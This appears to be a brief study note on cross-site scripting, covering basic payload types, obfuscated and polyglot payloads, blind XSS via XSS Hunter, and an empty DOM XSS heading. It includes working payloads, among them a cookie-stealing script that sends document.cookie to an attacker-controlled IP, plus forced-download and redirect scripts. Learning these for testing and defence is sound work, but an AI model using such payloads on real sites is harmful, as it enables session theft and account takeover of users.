# 1. Cross-Site Scripting XSS

## 1.1 What are they?

Client-side attacks that allow an attacker to create specific web requests and inject malicious code into a response.

### 1.2 Basic types of XSS attacks

**Cookie Stealing XSS:**

```js
<script>document.write('<img src="http://our_ip/get.php?cookie=' %2B document.cookie %2B '"/>');</script>
```

**Forcing the Download of a File:**

```js
<script>var link = document.createElement('a'); link.href='link_to_the_file_to_download';link.download = "; document.body.appendChild(link);link.click();</script>
```

**Redirecting User:**
```js
<script>window.location = "link_to_the_redirect";</script>
```

## 2. Obfuscated/Polyglot XSS Payloads

Nowadays web apps usually have security measures such as WAFs or they block certain characters.

A simple example is checking and blocking `<script>` tags.

For this attackers have to be creative and use different anti-measures such as obfuscating the payload.

### 2.1 Polyglot Payloads

Polyglot payloads means taking many different types of payloads and obfuscation techniques and compiling them into one attack - basically chaining them.

## 3. Blind XSS

It is when the execution of a stored XSS payload is not visible to the attacker/user, but only to an administrator or back-end.

In order to help us validate the vulnerability we can use `XSS Hunter` which takes a screenshot of the victim's screen when the JS payload is executed and sends that back to the XSSHunters site, and it will send us an alert that the payload has been executed.

## 4. DOM Based XSS
